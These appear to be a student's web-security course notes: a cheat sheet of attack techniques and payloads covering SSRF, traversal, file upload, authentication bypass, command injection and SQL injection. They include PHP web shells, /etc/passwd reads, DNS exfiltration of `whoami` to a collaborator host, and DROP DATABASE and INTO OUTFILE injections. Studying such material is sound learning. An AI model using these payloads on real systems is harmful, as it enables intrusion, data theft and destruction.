Information disclosure:
	-Files for web crawlers
	-Directory listings
	-Developer comments
	-Error messages
		- “expected a string but received a number
		- corrupt http requests
		- index out of range
	-Debugging data
		- phpinfo()
		- look for commented out debug href
		- Admin interface only available to local users - implies try changing IP in request to localhost
	-User account pages
		- try accessing other users
	-Backup files
	-Insecure configuration
		- HTTP TRACE with "X-User-Role: admin" in header
	-Version control history
	-robots.txt
	-sitemap.xml
	-root domain in case of missing index file
	-cookie name
	
SSRF:
	- https://example.com/upload.php?url=localhost/secret_file.txt
	This will cause server to fetch the local file and save it as profile picture
	When attacker visit his/her page, the photo may render as some text !
	- <iframe src=file:///etc/passwd></iframe> 
	- proxy https://example.com/proxy?url=admin.example.com
	- circumvent blacklist 
		- Use an alternative IP representation
 		http://127.0.0.1 - http://2130706433/ (integer representation)
		http://127.1 (short hand)
		http://localhost:80 - http://[::]:80/
		http://127.0.0.1/admin - http://127.0.0.1/%2561dmin
		- % becomes %25 in double encoding
	- login - http://login:password@attacker.com/admin/
	
Directory traversal:
	- http://example.com/files/../../../../shell.php
	- http://example.com/download.php?file=../../../etc/passwd 
	- full path /var/www/images/../../../etc/passwd
	- if ../ filtered:
		- Use ....//
		- ..%252f..%252f..%252fetc/passwd
		- URL encoding or double URL encoding
			../ same as %2e%2e%2f or %252e%252e%252f
		– Use a null byte to terminate the file path
			– filename=../../../etc/passwd%00.png
			%00 is null charcter

File upload:
	- <?php echo system($_GET['command']); ?>
	- <?php echo file_get_contents('/path/to/target/file'); ?>
	
	- Filename parameter set to .htaccess
	- Content-Type header set to text/plain
	- Contents of file set to
	  AddType application/x-httpd-php .xyz
	
	- Multiple extensions (exploit.php.jpg)
	- exploit%2Ephp
	- exploit.php%00.jpg
	
	- filename set to exploit.php
	- Content-Type header set to image/jpeg
	- Contents of file set some web shell payload
	
	- exiftool in slide 42
	
	- Filename is set to ../images/exploit.php
	- This saves the uploaded file in some other folder
	- Then retrieve the file via “GET
	- /var/www/html/../images/exploit.php”
	
Authentication:
	- Error messages: Returned error message are different
	- Response times
	- Each username is only attempted once - limit never reached or used under the limit
	- Add valid login:passwd (of attacker’s) after every 2 guesses of attempted login
	- If JSON supported - {"username": "Chotu","password": ["123456","password!","IruleWorld"]}
	
	- 2FA
	- Internally user logged in before OTP given
	- Server doesn't verify user in OTP step so M logs in, changed OTP request to A. Brute-forces OTP.
	- Tokens generated by hashing predictable values.
	- Reset password - M's token but username as A in POST
	- Choose victim username - Set two non matching new passwords 
		- Enumerate various passwords under the current password field
		- Whatever password results in “new passwords do not match” is the correct password
	
	- First guess username with static password - examine response lenegth then password.
	
	- X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
	- username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc

Authorization:
	- Vertical
		- Link in html
		- Case sensitive filter
		- Other IDs
		- Appending trailing slash
	- Horizontal
		- IDOR	
	- 1) Click on delete user, 2) Confirm you really want to delete user, 3) Then delete
		- Attacker directly performs step 2
		
Command Injection:
	-  echo ‘<pre>’
	- $domain = $_GET[domain];
	- echo shell_exec("ping -c 1 $domain");
	- echo ‘</pre>’
	- https://vulnerable-website.com/pingStatus?domain=www.cse.iitb.ac.in; echo gotcha
		-  ; and && and || can work in Linux
		
	- Name of current user: whoami
	- Operating system: uname -a (linux)
	- Network configuration: ifconfig (linux)
	- Network connections: netstat -an (both)
	- Running processes: ps -ef (linux)
	- Directory: ls (linux)
	
	- “www.cse.iitb.ac.in; whoami > /var/www/html/whoami.txt ;”
	
	- Modify the storeID parameter, giving it the value 1|whoami.
	- Modify the email parameter, changing it to: email=x||ping+-c+10+127.0.0.1||
	- email=||whoami>/var/www/images/output.txt|| for a writeable directory
	- email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
	- email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||

SQL Injection:
	- Everything after --space is comment
	- https://vulnerable-website.com/students.php?course=cs101'--%20
	- https://vulnerable-website.com/students.php?course=cs101'%20OR%201=1–%20
	- https://vulnerable-website.com/students.php?course='+UNION+SELECT+username,+password+FROM+users--
	- UNION attacks must return same number and types of column
	- UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php'--
	- In a password change field 
		- UPDATE users SET password='67890' WHERE username = 'Chotu'; DROP DATABASE database-name-- ' AND password='12345'
